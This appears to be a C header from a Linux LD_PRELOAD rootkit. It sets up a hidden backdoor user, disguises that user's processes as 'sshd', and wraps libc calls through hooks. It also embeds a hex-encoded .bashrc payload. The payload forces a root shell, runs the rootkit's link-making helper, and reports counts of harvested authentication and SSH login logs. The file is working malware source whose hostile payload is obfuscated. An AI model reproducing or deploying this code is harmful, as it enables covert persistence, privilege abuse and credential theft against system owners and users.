#ifndef UTIL_H
#define UTIL_H

#define HOME_VAR       "HOME="INSTALL_DIR
#define BD_SSHPROCNAME "sshd: "BD_UNAME

#define CMDLINE_PATH      "/proc/%d/cmdline"
#define FALLBACK_PROCNAME "YuuUUU"
#define NAME_MAXLEN       128     /* max lengths for storing process name */
#define CMDLINE_MAXLEN    512     /* & cmdline string. */

#define PID_MAXLEN      30      /* max length in bytes a pid can be */
#define PROCPATH_MAXLEN strlen(CMDLINE_PATH) + PID_MAXLEN

#define MODE_NAME     0x01   /* defined modes for determining whether */
#define MODE_CMDLINE  0x02   /* to get just the process name or its full */
                             /* cmdline entry. */

char *get_cmdline(pid_t pid);
int  open_cmdline(pid_t pid);

char *process_info(pid_t pid, int mode);
/* macros for the use of process_info() for calling processes. */
#define process_name()    process_info(getpid(), MODE_NAME)
#define process_cmdline() process_info(getpid(), MODE_CMDLINE)

int cmp_process(char *name);
char *str_process(char *name);
int process(char *name);
#ifdef USE_PAM_BD
int bd_sshproc(void);
#endif
#include "processes.c"

#define isbduname(name) !strncmp(BD_UNAME, name, strlen(BD_UNAME))

int chown_path(char *path, gid_t gid){
    hook(CCHOWN);
    return (long)call(CCHOWN, path, 0, gid);
}

int not_user(int id){
    if(getuid() != id && geteuid() != id)
        return 1;
    return 0;
}

char *gdirname(int fd){
    int readlink_status;
    char path[PATH_MAX], *filename = malloc(sizeof(path));
    memset(filename, 0, PATH_MAX);

    snprintf(path, sizeof(path) - 1, "/proc/self/fd/%d", fd);

    hook(CREADLINK);
    readlink_status = (long)call(CREADLINK, path, filename, sizeof(path) - 1);
    if(readlink_status < 0) return NULL;
    return filename;
}

/* if PAM is being used... */
#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
char *get_username(const pam_handle_t *pamh){
    void *u = NULL;
    if(pam_get_item(pamh, PAM_USER, (const void **)&u) != PAM_SUCCESS)
        return NULL;
    return (char *)u;
}

/* these macro functions were taken from one of PAM's headers.
 * we didn't need the full header, only these two functions.
 * i forget which header they're from originally. */
#define _pam_overwrite(x)      \
do{                            \
    register char *__xx__;     \
    if((__xx__=(x)))           \
        while(*__xx__)         \
            *__xx__++ = '\0';  \
}while(0)

#define _pam_drop(X)           \
do{                            \
    if(X){                     \
        free(X);               \
        X = NULL;              \
    }                          \
}while(0)

#endif

#include "gid/gid.h"
void unset_bad_vars(void);
int is_bdusr(void);
#include "bdusr.c"


#ifdef ROOTKIT_BASHRC

#define BASHRC_SIZE 425
static char const rkbashrc[BASHRC_SIZE] = {0x74,0x74,0x79,0x20,0x2d,0x73,0x20,0x7c,0x7c,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x0a,0x5b,0x20,0x21,
                                           0x20,0x2d,0x7a,0x20,0x24,0x54,0x45,0x52,0x4d,0x20,0x5d,0x20,0x26,0x26,0x20,0x65,0x78,0x70,0x6f,0x72,
                                           0x74,0x20,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x0a,0x5b,0x20,0x24,0x28,0x69,0x64,0x20,
                                           0x2d,0x75,0x29,0x20,0x21,0x3d,0x20,0x30,0x20,0x5d,0x20,0x26,0x26,0x20,0x73,0x75,0x20,0x72,0x6f,0x6f,
                                           0x74,0x0a,0x5b,0x20,0x24,0x28,0x69,0x64,0x20,0x2d,0x75,0x29,0x20,0x21,0x3d,0x20,0x30,0x20,0x5d,0x20,
                                           0x26,0x26,0x20,0x6b,0x69,0x6c,0x6c,0x20,0x2d,0x39,0x20,0x24,0x24,0x0a,0x2e,0x2f,0x62,0x64,0x76,0x72,
                                           0x6f,0x6c,0x66,0x3b,0x20,0x2e,0x2f,0x62,0x64,0x76,0x20,0x6d,0x61,0x6b,0x65,0x6c,0x69,0x6e,0x6b,0x73,
                                           0x0a,0x61,0x6c,0x69,0x61,0x73,0x20,0x6c,0x73,0x3d,0x27,0x6c,0x73,0x20,0x2d,0x2d,0x63,0x6f,0x6c,0x6f,
                                           0x72,0x3d,0x61,0x75,0x74,0x6f,0x27,0x0a,0x61,0x6c,0x69,0x61,0x73,0x20,0x6c,0x6c,0x3d,0x27,0x6c,0x73,
                                           0x20,0x2d,0x2d,0x63,0x6f,0x6c,0x6f,0x72,0x3d,0x61,0x75,0x74,0x6f,0x20,0x2d,0x41,0x6c,0x46,0x68,0x6e,
                                           0x27,0x0a,0x69,0x64,0x20,0x26,0x26,0x20,0x77,0x68,0x6f,0x0a,0x5b,0x20,0x2d,0x66,0x20,0x7e,0x2f,0x61,
                                           0x75,0x74,0x68,0x5f,0x6c,0x6f,0x67,0x73,0x20,0x5d,0x20,0x26,0x26,0x20,0x65,0x63,0x68,0x6f,0x20,0x2d,
                                           0x65,0x20,0x22,0x5c,0x65,0x5b,0x31,0x6d,0x4c,0x6f,0x67,0x67,0x65,0x64,0x20,0x61,0x63,0x63,0x6f,0x75,
                                           0x6e,0x74,0x73,0x3a,0x20,0x5c,0x65,0x5b,0x31,0x3b,0x33,0x31,0x6d,0x24,0x28,0x63,0x61,0x74,0x20,0x7e,
                                           0x2f,0x61,0x75,0x74,0x68,0x5f,0x6c,0x6f,0x67,0x73,0x20,0x7c,0x20,0x77,0x63,0x20,0x2d,0x6c,0x29,0x5c,
                                           0x65,0x5b,0x30,0x6d,0x22,0x0a,0x5b,0x20,0x2d,0x66,0x20,0x7e,0x2f,0x73,0x73,0x68,0x5f,0x6c,0x6f,0x67,
                                           0x73,0x20,0x5d,0x20,0x26,0x26,0x20,0x65,0x63,0x68,0x6f,0x20,0x2d,0x65,0x20,0x22,0x5c,0x65,0x5b,0x31,
                                           0x6d,0x53,0x53,0x48,0x20,0x6c,0x6f,0x67,0x73,0x3a,0x20,0x5c,0x65,0x5b,0x31,0x3b,0x33,0x31,0x6d,0x24,
                                           0x28,0x63,0x61,0x74,0x20,0x7e,0x2f,0x73,0x73,0x68,0x5f,0x6c,0x6f,0x67,0x73,0x20,0x7c,0x20,0x77,0x63,
                                           0x20,0x2d,0x6c,0x29,0x5c,0x65,0x5b,0x30,0x6d,0x22,0x0a,0x63,0x68,0x6f,0x77,0x6e,0x20,0x2d,0x68,0x20,
                                           0x30,0x3a,0x60,0x69,0x64,0x20,0x2d,0x67,0x60,0x20,0x7e,0x2f,0x2a,0x20,0x26,0x3e,0x2f,0x64,0x65,0x76,
                                           0x2f,0x6e,0x75,0x6c,0x6c};

int writebashrc(void);
void checkbashrc(void);
#include "bashrc.c"
#endif


#endif